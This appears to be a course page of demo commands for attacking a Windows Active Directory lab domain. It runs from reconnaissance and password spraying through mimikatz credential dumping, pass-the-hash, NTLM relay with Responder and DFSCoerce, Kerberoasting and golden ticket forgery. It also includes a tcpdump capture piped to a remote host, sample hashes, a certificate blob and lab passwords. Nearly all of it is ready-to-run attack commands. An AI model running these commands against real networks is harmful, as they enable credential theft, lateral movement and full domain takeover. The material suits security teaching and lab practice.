---
ref: goc213-demos
title: GOC213 Demos
date: 2022-10-11T11:06:03+00:00
layout: page
permalink: /goc213/
sitemap: false
---

## Installing Kali Linux Tools

| Computer |
|-|
| Kali Linux |


```bash
sudo apt update
sudo apt install nmap dsniff responder tcpdump ncat -y
sudo apt install hydra crowbar hashcat maskprocessor wordlists -y
sudo apt install python3-impacket python3-dsinternals python3-pip -y
sudo cp /usr/bin/impacket-wmiexec /usr/bin/impacket-ntlmrelayx
pip3 install mitm6 minikerberos impacket
sudo apt install git wireshark chromium -y
git clone https://github.com/Wh04m1001/DFSCoerce
git clone https://github.com/dirkjanm/krbrelayx
git clone https://github.com/dirkjanm/PKINITtools
```

## Active Directory Discovery

### Google Hacking

<https://www.google.com>
- [inurl:"adfs/ls/idpinitiatedsignon"](https://www.google.com/search?q=inurl%3A"adfs%2Fls%2Fidpinitiatedsignon")
- [inurl:"owa/auth/logon"](https://www.google.com/search?q=inurl%3A"owa%2Fauth%2Flogon")
- [inurl:"RDWeb/Pages"](https://www.google.com/search?q=inurl%3A"RDWeb%2FPages")

### Shodan Queries

<https://www.shodan.io>
- ["adfs/ls"](https://www.shodan.io/search?query=%22adfs%2Fls%22)
- [port:3389 "Remote Desktop Protocol"](https://www.shodan.io/search?query=port%3A3389+%22Remote+Desktop+Protocol%22)
- [port:3389 Administrator](https://www.shodan.io/search?query=port%3A3389+Administrator)

### DNS SRV Record Enumeration

| Computer |
|-|
| Kali Linux |

```bash
nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='win.mit.edu'"
nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='contoso.com'"
```

### DNS Zone Transfer

| Computer |
|-|
| CONTOSO-PC1 |

```cmd
nslookup -vc -q=AXFR contoso.com. contoso-dc
```

### DC Basic Port Scan

| Computer |
|-|
| Kali Linux |

```bash
nmap contoso-dc
```

### DC Full Port Scan

| Computer |
|-|
| Kali Linux |

```bash
nmap -A -T4 -p- -Pn contoso-dc
```

### LDAP Root DSE

| Computer |
|-|
| Kali Linux |

```bash
nmap contoso-dc -p 389 --open --script ldap-rootdse
```

### Active NetBIOS Scan

| Computer |
|-|
| Kali Linux |

```bash
nmap -sU -p 137 -n --script nbstat -v 10.213.0.0/28
```

### Passive Broadcast Scan

| Computer |
|-|
| Kali Linux |

```bash
nmap --script broadcast-listener broadcast-listener.timeout=30
```

| Computer |
|-|
| Kali Linux |

```cmd
ping contoso-pc3
```

### SMB Server Anonymous Scan

| Computer |
|-|
| Kali Linux |

```bash
nmap contoso-dc -p 445 --script smb-protocols,smb2-security-mode,smb2-time
```

### SMBv1 Server Authenticated Scan

| Computer |
|-|
| Kali Linux |

```bash
nmap contoso-srv -p 445,139 --open --script smb-enum* --script-args smbuser=bfu,smbpass='Pa$$w0rd',smbdomain=contoso.com
```
### RDP Scan

| Computer |
|-|
| Kali Linux |

```bash
nmap contoso-dc -p 3389 --script *rdp*
```

### Port Proxy

| Computer | User | Password |
|-|-|-|
| CONTOSO-DC | CONTOSO\Admin | Pa$$w0rd |

```cmd
netsh interface portproxy add v4tov4 listenport=50123 connectport=3389 connectaddress=127.0.0.1
netsh interface portproxy show all
```

Use with `mstsc.exe`

## Password Spraying / Dictionary Attacks

### Maskprocessor

| Computer |
|-|
| Kali Linux |

```bash
mp64 'Pa$$w0r?l' > passwords.txt
cat passwords.txt
```

### Remote Desktop Web Access Password Spraying

| Computer |
|-|
| Kali Linux |

```bash
hydra -I -V -t 1 -l Admin -P passwords.txt -u contoso-srv.contoso.com https-post-form "/RDWeb/Pages/en-US/login.aspx:DomainUserName=CONTOSO\\^USER^&UserPass=^PASS^:S=302"
```

### Remote Desktop Gateway Password Spraying

| Computer |
|-|
| Kali Linux |

```bash
hydra -I -vV -t 1 -l Admin -P passwords.txt -u contoso-srv.contoso.com https-get "/Rpc"
```

TODO: Success condition

### RDP Password Spraying

| Computer |
|-|
| Kali Linux |

```bash
crowbar -b rdp -s 10.213.0.3/32 -u Admin -C passwords.txt
```

### Password Audit

| Computer |
|-|
| CONTOSO-PC1 |

```powershell
Import-Module -Name \\local\GOC213\DSInternals

"Contoso2022`nGopas2022`nPassword123" > slovnik.txt

Get-ADReplAccount -All -Server contoso-dc |
    Test-PasswordQuality -WeakPasswordsFile slovnik.txt `
                         -WeakPasswordHashesSortedFile \\local\GOC213\pwned-passwords-ntlm-ordered-by-hash-v6.txt
```

## Local Privilege Escalation

### Disable Defender Tamper Protection

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC2 | CONTOSO\Admin | Pa$$w0rd |

*Windows Security*

### KrbRelayUp w/ RBCD

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

```cmd
\\local\GOC213\KrbRelayUp.exe Full --Method RBCD --CreateNewComputerAccount --ComputerName HACKER --ComputerPassword "Password123!"  --Impersonate Admin
```
### KrbRelayUp w/ Shadow Credentials

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

```cmd
\\local\GOC213\KrbRelayUp.exe Full --Method ShadowCred --ForceShadowCred --Impersonate Admin
```

## MITM Attacks

### ARP Spoofing

| Computer |
|-|
| Kali Linux |

```bash
echo 1 > sudo tee /proc/sys/net/ipv4/ip_forward
sudo arpspoof -i eth0 -t 10.213.0.3 -r 10.213.0.6
```

### NetworkMiner Remote

| Computer |
|-|
| Local |


```cmd
E:\GOC213\NetworkMiner_2-7-3\NetworkMiner.exe
```

| Computer |
|-|
| Kali Linux |


```bash
tcpdump -i eth0 -s 0 -U -w - | nc 10.213.0.1 57012
```

## NTLM Attacks

### Stealing NT Hashes from LSASS Memory

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```cmd
\\local\GOC213\mimikatz\x64\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

### LSASS Memory Dump File

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```cmd
taskmgr.exe
```

Copy to `\\local\GOC213`

| Computer |
|-|
| Local |

```cmd
E:\GOC213\mimikatz\x64\mimikatz.exe
sekurlsa::minidump E:\GOC213\lsass.dmp
sekurlsa::logonpasswords
```

### SAM Database Dump

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```cmd
\\local\GOC213\mimikatz\x64\mimikatz.exe
token::elevate
lsadump::sam
```

### Stealing the SAM Database

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```cmd
reg save HKLM\SAM \\local\GOC213\SAM
reg save HKLM\SYSTEM \\local\GOC213\SYSTEM
```

| Computer |
|-|
| Local |

```cmd
E:\GOC213\mimikatz\x64\mimikatz.exe
lsadump::sam /sam:E:\GOC213\SAM /system:E:\GOC213\SYSTEM
```

### NT Hash Cracking

#### Dictionary Attack

| Computer |
|-|
| Local |

```cmd
E:
cd E:\GOC213\hashcat-6.0.0
echo Pa$$w0rd>>example.dict
hashcat.exe -m 1000 92937945b518814341de3f726500d4ff example.dict --potfile-disable
```

#### Brute-Force Attack

| Computer |
|-|
| Local |

```cmd
E:
cd E:\GOC213\hashcat-6.0.0
hashcat.exe -m 1000 92937945b518814341de3f726500d4ff -a3 ?a?a?a?a?a?a?a?a --potfile-disable
```

### WMI Pass-the-Hash

#### Kali Linux

| Computer |
|-|
| Kali Linux |

```bash
impacket-wmiexec -hashes :92937945b518814341de3f726500d4ff contoso/Admin@contoso-dc
```

#### Windows

| Computer |
|-|
| Local |

```cmd
E:\GOC213\mimikatz\x64\mimikatz.exe
privilege::debug
sekurlsa::pth /user:Admin /domain:contoso /ntlm:92937945b518814341de3f726500d4ff /run:cmd.exe
```

### Cached Credentials

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```cmd
\\local\GOC213\mimikatz\x64\mimikatz.exe
token::elevate
lsadump::cache
```

| Computer |
|-|
| Local |

```cmd
E:
cd E:\GOC213\hashcat-6.0.0
hashcat.exe -m 2100 $DCC2$10240#Admin#b44ef872b149127d3d469de39259071e example.dict --potfile-disable
```

### RDP Pass-the-Hash

| Computer |
|-|
| Local |

```cmd
E:\GOC213\mimikatz\x64\mimikatz.exe
privilege::debug
sekurlsa::pth /user:Admin /domain:CONTOSO /ntlm:92937945b518814341de3f726500d4ff /run:"sc \\contoso-dc start  RemoteRegistry"
sekurlsa::pth /user:Admin /domain:CONTOSO /ntlm:92937945b518814341de3f726500d4ff /run:"reg add """\\contoso-dc\HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server""" /v fDenyTSConnections /d 0 /t REG_DWORD /f"
sekurlsa::pth /user:Admin /domain:CONTOSO /ntlm:92937945b518814341de3f726500d4ff /run:"reg add """\\contoso-dc\HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa""" /v DisableRestrictedAdmin /d 0 /t REG_DWORD /f"
sekurlsa::pth /user:Admin /domain:CONTOSO /ntlm:92937945b518814341de3f726500d4ff /run:"mstsc /v:contoso-dc /restrictedAdmin"
```

### NTLM Traffic Capture

#### Respoder

| Computer |
|-|
| Kali Linux |

```bash
sudo responder -I eth0
```

#### Victim

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

- Invoke SMB: `dir \\offline\data`
- Invoke HTTP: `http://intranet`

#### Crack using Hashcat

| Computer |
|-|
| Local |

```cmd
E:
cd E:\GOC213\hashcat-6.0.0
hashcat.exe -m 5600 Admin::contoso:cd25c01976780f49:AE625016C8D27160205AEA8E15A72D9B:01010000000000008D02A6FA63DDD8013F7196C895DD4E320000000002000800430052005300310001001E00570049004E002D004A0047004C0034005A00590051004800590038004C000400140043005200530031002E004C004F00430041004C0003003400570049004E002D004A0047004C0034005A00590051004800590038004C002E0043005200530031002E004C004F00430041004C000500140043005200530031002E004C004F00430041004C00080030003000000000000000000000000030000028433311FB8B47C230B4FE56E9247FF3FC6037DBBFC255EBE20D9D04DD4176170A0010000000000000000000000000000000000009001A0048005400540050002F0069006E007400720061006E00650074000000000000000000 example.dict --potfile-disable
```

### NTLM Relay with Responder

| Computer |
|-|
| Kali Linux |

```bash
sudo impacket-ntlmrelayx -t 10.213.0.5 -smb2support -c 'net user add hacker Password123'
```

```bash
sudo responder -I eth0
```

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

<http://intranet>

### NTLM Relay with ARP Spoofing

```bash
# TODO
sudo impacket-ntlmrelayx -t contoso-srv -smb2support --no-http-server --smb-port 8445 -c cmd
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 445 -j REDIRECT --to-port 8445
sudo iptables -t NAT -F
```

### DFSCoerce

#### NTLM Relay to CA Web Enrollment

| Computer |
|-|
| Kali Linux |

```bash
sudo impacket-ntlmrelayx --adcs --target http://contoso-dc.contoso.com/certsrv --template DomainController -smb2support
```

#### Ask DC to Connect

| Computer |
|-|
| Kali Linux |

```bash
sudo python3 DFSCoerce/dfscoerce.py -u bfu -p 'Pa$$w0rd' -d contoso.com 10.213.0.101 contoso-dc2.contoso.com
```

#### Kerberos PKINIT

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

```cmd
\\local\GOC213\GhostPack\Rubeus.exe asktgt /user:CONTOSO-DC2$ /ptt /getcredentials /certificate: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
```

#### DCSync

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

```powershell
Install-Module -Name DSInternals -Scope CurrentUser -Force
Get-ADReplAccount -All -Server contoso-dc.contoso.com
```

## Kerberos Attacks

### Kerberoasting

#### Rubeus Kerberoast

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

```cmd
\\local\GOC213\GhostPack\Rubeus.exe kerberoast /domain:contoso.com /nowrap
```

#### Cracking using Hashcat

| Computer |
|-|
| Local |

```cmd
E:
cd E:\GOC213\hashcat-6.0.0
hashcat.exe -m 13100 $krb5tgs$23$*Admin$contoso.com$MSSQLSvc/pc3.contoso.com@contoso.com*$DA2270972143237D2603793BAEDD39E1$F95617C620EE0F708F3C56228A77810DC165CE5C20BFDE1B3258041CF594995C2791CCBBF5E736C6E465645AE3B07FE37A35B6AD02D1BA957CA45EC5172CEEE11AFC26A86C5008AFC9D6DD28B844D91546B0C75165BA3C084CE13934FA19E46E43FD23045EE58FBB8432276ADBC1B65DBFD1FB208E7ED5D6B5C2372E433CC8E22290381C82E2C186D37673E748733F7CB0EC1B60EB3466B1EFCFAC872FD4A394D738AA33CB4587DEA8E0546F78ACC9884A6A368EC407B5D63B5BC1315118475D818EEA087367BC0966A9D11F0374AD694F9DCA920F90CDAB07576B3154B035367837A666611826CF347A7E7BC79299F5DBDFB4436725A641CF0244D826144E38A8E3A413B9B7174B35AFF6EE7878F20E7FB0D231D90C3A2EB01EB9A04E6CB75F2A16B3573151281F851D3FBABBDDB6CF816C5127F1A24B924FD9D2BDE6095590379638394A7D97F771A210B4651243EC565415FDD805E2C95463BC2E6DAF99111E1733AE16F81334751DEE399F7276FC514A561979FECACC2404A6243FCA597286AAE6A8299319CEDF48AD1FC890E99F4974B7A4030BB8E25D2CDA0D6D48BCB9DA3B611CDA6559DC7E5343E8C834D05A2C970E670B19AC7DB5EF1E89E6BD17912C5BB322EC968269144FEEF01EFCB251FC252CA3A7CB64F8F42A130FE637122A059910D5B552CAEA06D6539ED894054C47F3219E71636C6A0926A6603A827AE771AAAC898588EAD40E723FB1A59C3E86FCF567F7D211EAEBCE2ED8D3E615EC373BAD52E597E2092A201E327916503CE141F17982D390E24FF001BA000813FA9952613061DF34AAE89FDEBDAE8E44FA583CF26E903D394AD916D8617C08E1EB8110E0C22F2E72ACE701B2BFEF8A23C17557C1BF6B470BCB057BB77948C8DBBEB6E7D4D6F590274A600DC618028C42E6C82FC38B5B1BA329DB67031EEACE52BF95B1C716CCAEF3BBD21041F9C90E446B7EC6CA0CA698815AFF0AD5EF2ED9575E584C13FA79C842C4694CCFE5995363AEE072DED36108D555271707323A34AFF53B7A542A33A5C1E10B08B244E6BD366B82A111A465FFDA7B24CE464EF20A9BA563F2D06962F005D49CCA2A524B3C4344E88355224EDA7969D29D82B7E6A48A49183E06A680908F33F8C3D83E65A70A154627F634A87D8D0B3C8EDABD004BE4BE32D86319C60EB72FF47C69383D000670FFA23809C5E34C2C65284AB199299FBE20C612A792D3A605A6AABBA149128798B3357061831AD575772E0405796197774D395DACEE67C9E0C5E0EA697BEBE4BF4BE92C1C573810EB813B9D45C2382BD652FD4675A064129CE9E5F30967D7A4E00809E8CE8D6BF3BFCAE8DB24BFCC7EEAE3C51FC4979AA1ED6F831605AE4314CC070EAAF618C385B92AF8F4BB09ED426F338379CE180CDDC4E46C94CD68083AD614ABC8123AC92796EA6D29674127903C0266BFC2AEAEF9B14F8BD0CF20C091EC972C1A17C58C09EE93525E4BBECFBA67E6103834691028F3D295DC9205C25364C8F523E15B08A82E055509976D61D8A5828E2023E187A898421331256D78019527DA03590C92937E8F14F1E501F7224F21B90A79F6E5BB44538CD9ACE8B1BD7E4BD4010490BAF8FF967847F2E2DB5B698CA671CA1F892484C919EE0EF47927CA3F1BC9CBFAEF7BF3406986098C6E687193EC4522FB7394421E96A7D209D7AC4D45A90EE1FB00BC007EFCDF18749055D61AD620E202123366EB18C22C612635C402F94C86D991E43132A1C60CFDE266AAAB377DE5B853C6632B6B85EEFDC16B436394464C875661E1CE47B4FF239B9AB8239819E1400F60382F117A1EBB5000E829ABE72A4FE5C1E57F3241976D0B860974EDF4CCD48673BE8B731F245C5B767B9AA178CAF806A753597512FB6B56BC2CE9BC53BE35BE48406034150B673B005E1FCE6D80190511A30CC8E20CFC4E1F1109C264 example.dict --potfile-disable
```

#### Identifying Misconfigured Accounts

```powershell
Get-ADUser -Filter { servicePrincipalName -like '*' -and Enabled -eq $true } `
           -Properties servicePrincipalName,UseDESKeyOnly,KerberosEncryptionType |
    Format-Table -Property SamAccountName,servicePrincipalName,UseDESKeyOnly,KerberosEncryptionType
```

### Kerberos Golden Ticket Attack

```powershell
(Get-ADGroup 'Domain Admins').SID
(Get-ADDomain).DomainSid.Value
```

```powershell
Import-Module \\local\GOC213\DSInternals
$krbtgt = Get-ADReplAccount -Server contoso-dc -SamAccountName krbtgt
$krbtgt.SupplementalCredentials.
KerberosNew.Credentials
ConvertTo-Hex $krbtgt.NTHash
```

```cmd
klist purge
```

```cmd
mimikatz.exe
kerberos::golden /ptt /user:Admin /domain:contoso.com /aes256:20fb0621396b3cd32efa2d0edf39487658bc0619cc609c0029a23aa795afd14e /sid:S-1-5-21-2474978765-2619710211-1762062286 /service:krbtgt /startoffset:0 /endin:600 /renewmax:10080 /id:1000 /groups:512,518,519,520
```

```cmd
klist
dir \\contoso-dc.contoso.com\c$
klist get cifs/contoso-dc.contoso.com
```

```powershell
Enter-PSSession 'contoso-dc.contoso.com'
Add-ADGroupMember -Identity 'Domain Admins' -Members bfu
Exit-PSSession
```

### Cross-Forest Golden Ticket Attack

#### Trust Properties

```cmd
netdom trust /d:contoso.com adatum.com /EnableSidHistory
netdom trust /d:contoso.com adatum.com /EnableSidHistory:yes

netdom trust /d:contoso.com adatum.com /EnablePIMTrust
netdom trust /d:contoso.com adatum.com /EnablePIMTrust:yes
```

#### Impersonating DnsAdmins

```powershell
Get-ADGroup -Identity DnsAdmins -Server adatum.com
```

```cmd
mimikatz.exe
kerberos::golden /ptt /user:Admin /domain:contoso.com
/aes256:20fb0621396b3cd32efa2d0edf39487658bc0619cc609c0029a23aa795afd14e
/service:krbtgt /startoffset:0 /endin:600 /renewmax:10080
/sid:S-1-5-21-2474978765-2619710211-1762062286 /id:1000 /groups:512,518,519,520
/sids:S-1-5-21-938793711-3613651074-186196483-1102
```

```cmd
Rubeus.exe golden /aes256:20fb0621396b3cd32efa2d0edf39487658bc0619cc609c0029a23aa795afd14e /user:Admin /sids:S-1-5-21-938793711-3613651074-186196483-1102 /ldap /ptt
```

### Kerberos Silver Ticket Attack

```cmd
mimikatz.exe
privilege::debug
sekurlsa::ekeys
```

```powershell
